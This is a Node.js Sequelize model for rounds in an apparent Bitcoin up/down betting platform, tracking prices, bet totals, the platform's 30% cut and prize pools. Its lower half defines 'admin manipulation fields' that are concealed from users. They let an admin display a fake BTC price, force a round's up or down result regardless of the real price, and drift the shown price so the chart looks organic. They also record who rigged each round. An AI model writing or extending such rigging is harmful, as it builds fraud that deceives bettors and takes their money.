
const { DataTypes } = require('sequelize');
const { sequelize } = require('../config/database');

const Round = sequelize.define('Round', {
  id: {
    type: DataTypes.UUID,
    defaultValue: DataTypes.UUIDV4,
    primaryKey: true
  },
  roundNumber: {
    type: DataTypes.INTEGER,
    allowNull: false,
    unique: true
  },
  status: {
    type: DataTypes.ENUM('upcoming', 'active', 'locked', 'completed', 'cancelled'),
    defaultValue: 'upcoming'
  },
  startTime: {
    type: DataTypes.DATE,
    allowNull: false
  },
  lockTime: {
    type: DataTypes.DATE,
    allowNull: false,
    comment: 'Time when betting closes (30 seconds before end)'
  },
  endTime: {
    type: DataTypes.DATE,
    allowNull: false
  },
  startPrice: {
    type: DataTypes.DECIMAL(12, 2),
    allowNull: true,
    comment: 'BTC price at round start'
  },
  endPrice: {
    type: DataTypes.DECIMAL(12, 2),
    allowNull: true,
    comment: 'BTC price at round end'
  },
  result: {
    type: DataTypes.ENUM('up', 'down', 'tie', 'cancelled'),
    allowNull: true
  },
  totalUpAmount: {
    type: DataTypes.DECIMAL(15, 2),
    defaultValue: 0.00
  },
  totalDownAmount: {
    type: DataTypes.DECIMAL(15, 2),
    defaultValue: 0.00
  },
  totalUpBets: {
    type: DataTypes.INTEGER,
    defaultValue: 0
  },
  totalDownBets: {
    type: DataTypes.INTEGER,
    defaultValue: 0
  },
  totalFeeCollected: {
    type: DataTypes.DECIMAL(15, 2),
    defaultValue: 0.00
  },
  platformCut: {
    type: DataTypes.DECIMAL(15, 2),
    defaultValue: 0.00,
    comment: '30% of losers pool'
  },
  prizePool: {
    type: DataTypes.DECIMAL(15, 2),
    defaultValue: 0.00,
    comment: '70% of losers pool distributed to winners'
  },
  isProcessed: {
    type: DataTypes.BOOLEAN,
    defaultValue: false,
    comment: 'Whether winners have been paid'
  },

  // ============================================================
  // ✅ ADMIN MANIPULATION FIELDS
  // These are never exposed to users
  // Only admin endpoints read/write these fields
  // ============================================================

  adminPriceOverride: {
    type: DataTypes.DECIMAL(12, 2),
    allowNull: true,
    defaultValue: null,
    comment: 'Fake price admin sets — users see this instead of real BTC price'
  },
  adminPriceEnabled: {
    type: DataTypes.BOOLEAN,
    defaultValue: false,
    comment: 'Is admin price override currently active?'
  },
  adminForcedResult: {
    type: DataTypes.ENUM('up', 'down'),
    allowNull: true,
    defaultValue: null,
    comment: 'Admin forced result — overrides real price comparison at round end'
  },
  adminPriceDrift: {
    type: DataTypes.DECIMAL(12, 2),
    allowNull: true,
    defaultValue: null,
    comment: 'Target price to drift toward naturally so chart looks organic'
  },
  adminNote: {
    type: DataTypes.STRING(500),
    allowNull: true,
    defaultValue: null,
    comment: 'Admin internal note for why this round was manipulated'
  },
  manipulatedAt: {
    type: DataTypes.DATE,
    allowNull: true,
    defaultValue: null,
    comment: 'Timestamp of when admin last changed manipulation settings'
  },
  manipulatedBy: {
    type: DataTypes.UUID,
    allowNull: true,
    defaultValue: null,
    comment: 'Admin user ID who activated manipulation on this round'
  }

}, {
  timestamps: true,
  tableName: 'rounds',
  indexes: [
    { fields: ['roundNumber'] },
    { fields: ['status'] },
    { fields: ['startTime'] },
    { fields: ['endTime'] }
  ]
});

module.exports = Round;
